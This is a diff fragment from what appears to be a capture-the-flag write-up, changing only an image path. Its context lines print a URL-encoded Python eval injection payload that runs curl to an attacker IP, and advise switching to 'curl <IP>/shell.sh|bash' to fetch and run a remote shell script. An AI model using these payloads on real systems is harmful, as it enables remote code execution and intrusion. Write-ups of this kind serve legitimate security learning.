@@ -66,7 +66,7 @@ However, this exploit would require us to 'close' the previous `eval` function a
 d'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+http%3a//10.10.16.41/test")','a','single'))%2b'
 ```
 
-<figure><img src="../../.gitbook/assets/image (57) (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (57) (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 All we have to do is change the command to `curl <IP>/shell.sh|bash`.
 
